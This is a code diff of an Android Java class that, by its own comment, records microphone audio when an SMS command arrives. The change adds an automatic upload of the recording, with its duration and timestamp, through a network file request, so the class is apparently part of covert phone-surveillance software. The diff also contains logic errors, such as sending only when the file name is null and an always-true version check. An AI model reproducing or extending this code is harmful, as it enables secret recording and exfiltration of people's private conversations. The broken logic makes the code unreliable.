@@ -2,19 +2,26 @@ package com.inet.android.audio;
 
 import java.io.File;
 import java.io.IOException;
-import java.text.SimpleDateFormat;
-import java.util.Date;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
 
+import android.content.Context;
 import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.Environment;
 
+import com.inet.android.request.FileRequest;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 
+/**
+ * RecordAudio class is designed to record audio after command
+ * smsBroadcastReceiver
+ * 
+ * @author johny homicide
+ * 
+ */
 public final class RecordAudio {
 
 	private static final int RECORDING_BITRATE = 44100;
@@ -23,6 +30,7 @@ public final class RecordAudio {
 	private MediaRecorder mMediaRecorder;
 	private final String TAG = "RecordAudio";
 	ConvertDate date;
+	String time;
 	private static final String mPathName = "data";
 
 	// Thread pool
@@ -31,16 +39,19 @@ public final class RecordAudio {
 	private AtomicBoolean mIsPlaying = new AtomicBoolean(false);
 	private AtomicBoolean mIsRecording = new AtomicBoolean(false);
 	String outputFileName;
+	private static Context mContext;
 
-	public RecordAudio(int minute) {
+	public RecordAudio(Context context, int minute) {
 		Logging.doLog(TAG, " RecordAudio", " RecordAudio");
 		mThreadPool = Executors.newCachedThreadPool();
 		this.minute = minute;
+		RecordAudio.mContext = context;
 	}
 
+	// --------create Record and start recording---------------
 	public void createRecord(String fileName) {
 		// reset any previous paused position
-		String format = "";
+		String format = ".aac";
 		// initialise MediaRecorder
 		if (mMediaRecorder == null) {
 			mMediaRecorder = new MediaRecorder();
@@ -56,7 +67,6 @@ public final class RecordAudio {
 						.setAudioEncoder(MediaRecorder.AudioEncoder.HE_AAC);
 				mMediaRecorder.setAudioSamplingRate(RECORDING_BITRATE);
 				mMediaRecorder.setAudioEncodingBitRate(32);
-				format = ".aac";
 
 			} else if (Build.VERSION.SDK_INT >= 10
 					|| Build.VERSION.SDK_INT < 16) {
@@ -68,7 +78,6 @@ public final class RecordAudio {
 				mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
 				mMediaRecorder.setAudioSamplingRate(RECORDING_BITRATE);
 				mMediaRecorder.setAudioEncodingBitRate(48);
-				format = ".aac";
 
 			} else {
 				mMediaRecorder
@@ -79,7 +88,6 @@ public final class RecordAudio {
 						.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
 				mMediaRecorder.setAudioSamplingRate(RECORDING_BITRATE_OLD);
 				mMediaRecorder.setAudioEncodingBitRate(8);
-				format = ".aac";
 
 			}
 			mMediaRecorder.setOnErrorListener(new RecorderErrorListener());
@@ -107,6 +115,7 @@ public final class RecordAudio {
 		}
 	}
 
+	// --------create Recording----------------
 	public void executeRecording() {
 		mThreadPool.execute(new Runnable() {
 
@@ -128,6 +137,7 @@ public final class RecordAudio {
 		});
 	}
 
+	// --------stop recording and call sendAudio----------------
 	private void executeStopRecording() {
 		mThreadPool.execute(new Runnable() {
 
@@ -136,6 +146,9 @@ public final class RecordAudio {
 				if (mMediaRecorder != null) {
 					stopRecording();
 					mIsRecording.set(false);
+					if (outputFileName == null)
+						SendAudio(outputFileName);
+					outputFileName = null;
 				}
 
 			}
@@ -157,9 +170,9 @@ public final class RecordAudio {
 		if (!filePath.exists()) {
 			filePath.mkdirs();
 		}
-		date.logTime();
+		time = date.logTime();
 
-		String file = dir + "/" + date.logTime();
+		String file = dir + "/" + time;
 		Logging.doLog(TAG, "file " + file, "file " + file);
 		File audioFile = new File(file);
 		try {
@@ -218,10 +231,12 @@ public final class RecordAudio {
 			mMediaRecorder = null;
 		}
 	}
-	
-	public void SendAudio() {
-		OperationWithAudio audio = new OperationWithAudio(this.outputFileName, this.minute);
-		
+
+	public void SendAudio(String path) {
+		FileRequest audio = new FileRequest(mContext, this.outputFileName,
+				this.minute, this.time);
+		audio.sendRequest();
+
 	}
 
 	/**
